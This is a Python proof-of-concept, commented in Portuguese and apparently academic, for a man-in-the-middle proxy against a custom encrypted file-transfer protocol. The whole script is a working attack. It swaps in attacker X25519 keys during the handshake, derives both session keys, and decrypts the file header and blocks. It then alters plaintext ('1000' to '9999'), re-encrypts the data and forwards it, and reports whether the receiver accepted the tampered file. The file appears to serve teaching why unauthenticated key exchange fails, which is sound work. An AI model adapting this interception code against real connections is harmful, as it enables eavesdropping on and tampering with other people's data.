"""
PoC MITM — TWO-HEADED-BEAST (uso académico).
Instruções completas: ataque/GUIA_MITM_PROXY.md
"""

import socket
import sys
import json
import cryptography

from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

from src.protocol import (
    HANDSHAKE_PUBKEY, TRANSFER_HEADER, BLOCK_DATA, SIGNATURE, STATUS_OK,
    recv_msg, send_msg,
)
from src.crypto_config import hash_to_cryptography
from src.kex import peer_pubkey_fingerprint

LISTEN_PORT = 9000
TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9000
HEADER_NONCE = b"\x00" * 12
TAMPER_TARGET = b"1000"
TAMPER_REPLACEMENT = b"9999"


def _exit_ctrl_c() -> None:
    print("\n[MITM] Interrompido (Ctrl+C).")
    sys.exit(130)


def _prompt(label: str, default: str) -> str:
    try:
        if not sys.stdin.isatty():
            return default
        raw = input(f"  {label} [{default}]: ").strip()
        return raw if raw else default
    except KeyboardInterrupt:
        _exit_ctrl_c()
    except EOFError:
        return default


def get_config():
    if len(sys.argv) >= 2:
        host = sys.argv[1]
        port = int(sys.argv[2]) if len(sys.argv) >= 3 else TARGET_PORT
        listen = int(sys.argv[3]) if len(sys.argv) >= 4 else LISTEN_PORT
        return host, port, listen

    print("Configuração do proxy MITM (Enter = padrão, Ctrl+C = sair):")
    print("  Ver ataque/GUIA_MITM_PROXY.md para a demo completa.\n")
    host = _prompt("IP do recetor real (servidor em modo Receber)", TARGET_HOST)
    port = int(_prompt("Porta do recetor real", str(TARGET_PORT)))
    listen = int(_prompt("Porta onde o proxy escuta (emissor liga aqui)", str(LISTEN_PORT)))
    return host, port, listen


def derive_keys(shared_secret, hash_name, cipher_name):
    algorithm = hash_to_cryptography(hash_name)
    salt = b"thb-v1-salt"
    hkdf_mac = HKDF(algorithm=algorithm, length=32, salt=salt, info=b"thb-mac-key")
    k_mac = hkdf_mac.derive(shared_secret)
    key_len = 16 if cipher_name == "AES-128-GCM" else 32
    hkdf_enc = HKDF(algorithm=algorithm, length=key_len, salt=salt, info=b"thb-encryption-key")
    k_enc = hkdf_enc.derive(shared_secret)
    return k_enc, k_mac


def decrypt_block(ciphertext, nonce, k_enc, cipher_name):
    if cipher_name in ("AES-128-GCM", "AES-256-GCM"):
        return AESGCM(k_enc).decrypt(nonce, ciphertext, None)
    return ChaCha20Poly1305(k_enc).decrypt(nonce, ciphertext, None)


def encrypt_block(plaintext, nonce, k_enc, cipher_name):
    if cipher_name in ("AES-128-GCM", "AES-256-GCM"):
        return AESGCM(k_enc).encrypt(nonce, plaintext, None)
    return ChaCha20Poly1305(k_enc).encrypt(nonce, plaintext, None)


def tamper(data: bytes):
    if TAMPER_TARGET and TAMPER_TARGET in data:
        rep = TAMPER_REPLACEMENT
        if len(rep) != len(TAMPER_TARGET):
            rep = (rep + b"X" * len(TAMPER_TARGET))[: len(TAMPER_TARGET)]
        return data.replace(TAMPER_TARGET, rep), True
    return data, False


def start_attack(target_host: str, target_port: int, listen_port: int):
    print("========================================================")
    print(f"🔥 [MITM] Escuta :{listen_port}  ->  recetor {target_host}:{target_port}")
    print("========================================================")

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(("0.0.0.0", listen_port))
    server_sock.listen(1)
    print(f"⏳ [MITM] À espera do emissor na porta {listen_port} (Ctrl+C para sair)...")

    try:
        client_conn, client_addr = server_sock.accept()
    except KeyboardInterrupt:
        server_sock.close()
        _exit_ctrl_c()

    print(f"⚡ [MITM] Emissor ligado a partir de {client_addr}")

    to_server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        to_server_sock.connect((target_host, target_port))
    except OSError as exc:
        print(f"🛑 [MITM] Não consegui ligar ao recetor em {target_host}:{target_port} -> {exc}")
        client_conn.close()
        server_sock.close()
        return
    print(f"⚡ [MITM] Ligado ao recetor real em {target_host}:{target_port}")

    mtype, client_pub_bytes = recv_msg(client_conn)
    if mtype != HANDSHAKE_PUBKEY:
        print("[-] Falha: não recebi a chave pública do emissor.")
        return

    fake_priv_for_server = X25519PrivateKey.generate()
    fake_pub_for_server = fake_priv_for_server.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
    fake_priv_for_client = X25519PrivateKey.generate()
    fake_pub_for_client = fake_priv_for_client.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)

    send_msg(to_server_sock, HANDSHAKE_PUBKEY, fake_pub_for_server)
    mtype, server_pub_bytes = recv_msg(to_server_sock)
    send_msg(client_conn, HANDSHAKE_PUBKEY, fake_pub_for_client)

    client_pub_obj = X25519PublicKey.from_public_bytes(client_pub_bytes)
    server_pub_obj = X25519PublicKey.from_public_bytes(server_pub_bytes)
    secret_with_client = fake_priv_for_client.exchange(client_pub_obj)
    secret_with_server = fake_priv_for_server.exchange(server_pub_obj)

    fp_real_emissor = peer_pubkey_fingerprint(client_pub_bytes)
    fp_real_recetor = peer_pubkey_fingerprint(server_pub_bytes)
    fp_visto_emissor = peer_pubkey_fingerprint(fake_pub_for_client)
    fp_visto_recetor = peer_pubkey_fingerprint(fake_pub_for_server)
    print("[+] Handshake MITM concluído.")
    print(f"    EMISSOR imprime ............ {fp_visto_emissor}  (chave do ATACANTE)")
    print(f"    ... chave REAL do recetor ... {fp_real_recetor}")
    print(f"    RECETOR imprime ............ {fp_visto_recetor}  (chave do ATACANTE)")
    print(f"    ... chave REAL do emissor .. {fp_real_emissor}")

    hash_name = "SHA256"
    cipher_name = "AES-256-GCM"
    k_enc_client, k_mac_client = derive_keys(secret_with_client, hash_name, cipher_name)
    k_enc_server, k_mac_server = derive_keys(secret_with_server, hash_name, cipher_name)

    mtype, protected_header = recv_msg(client_conn)

    try:
        header_json_bytes = decrypt_block(protected_header, HEADER_NONCE, k_enc_client, cipher_name)
        header_data = json.loads(header_json_bytes.decode("utf-8"))
        print(f"👀 [FICHEIRO] {header_data['filename']} | {header_data['original_size']} bytes")

        if header_data["hash"] != hash_name or header_data["cipher"] != cipher_name:
            hash_name = header_data["hash"]
            cipher_name = header_data["cipher"]
            k_enc_client, k_mac_client = derive_keys(secret_with_client, hash_name, cipher_name)
            k_enc_server, k_mac_server = derive_keys(secret_with_server, hash_name, cipher_name)
    except (cryptography.exceptions.InvalidTag, Exception):
        print("\n🛑 Não foi possível decifrar o cabeçalho. Usa AES-256-GCM + SHA256 na demo.\n")
        client_conn.close()
        to_server_sock.close()
        server_sock.close()
        return

    try:
        reprotected_header = encrypt_block(header_json_bytes, HEADER_NONCE, k_enc_server, cipher_name)
        send_msg(to_server_sock, TRANSFER_HEADER, reprotected_header)
    except OSError as exc:
        print(f"🛑 Falha a reenviar cabeçalho: {exc}")
        client_conn.close()
        to_server_sock.close()
        server_sock.close()
        return

    num_blocks = header_data["num_blocks"]
    houve_adulteracao = False

    try:
        for i in range(num_blocks):
            mtype, payload = recv_msg(client_conn)
            if mtype != BLOCK_DATA:
                break

            nonce_bytes = payload[:12]
            ciphertext = payload[12:]
            plaintext_block = decrypt_block(ciphertext, nonce_bytes, k_enc_client, cipher_name)
            print(f"📦 Bloco {i + 1}/{num_blocks} decifrado ({len(plaintext_block)} bytes).")

            block_modificado, alterou = tamper(plaintext_block)
            if alterou:
                houve_adulteracao = True
                print("⚠️  Texto-alvo substituído (1000 -> 9999).")

            new_ciphertext = encrypt_block(block_modificado, nonce_bytes, k_enc_server, cipher_name)
            send_msg(to_server_sock, BLOCK_DATA, nonce_bytes + new_ciphertext)
    except (OSError, ConnectionError) as exc:
        print(f"🛑 Ligação interrompida: {exc}")
        client_conn.close()
        to_server_sock.close()
        server_sock.close()
        return

    if not houve_adulteracao:
        print("ℹ️  Conteúdo lido; texto-alvo não encontrado (confidencialidade quebrada).")

    try:
        if header_data.get("signed"):
            mtype, sig_payload = recv_msg(client_conn)
            send_msg(to_server_sock, mtype, sig_payload)
            if mtype == SIGNATURE:
                print("✍️  Assinatura reencaminhada (não forjável).")

        mtype_status, payload_status = recv_msg(to_server_sock)
        send_msg(client_conn, mtype_status, payload_status)
        if mtype_status == STATUS_OK:
            print("[+] Recetor ACEITOU (sem assinatura, adulteração passou).")
        else:
            msg = payload_status.decode("utf-8", errors="replace")
            print(f"[-] Recetor REJEITOU: {msg}")
    except (OSError, ConnectionError) as exc:
        print(f"ℹ️  Fim da sessão: {exc}")

    client_conn.close()
    to_server_sock.close()
    server_sock.close()
    print("[MITM] Concluído.")


if __name__ == "__main__":
    try:
        cfg_host, cfg_port, cfg_listen = get_config()
        start_attack(cfg_host, cfg_port, cfg_listen)
    except KeyboardInterrupt:
        _exit_ctrl_c()
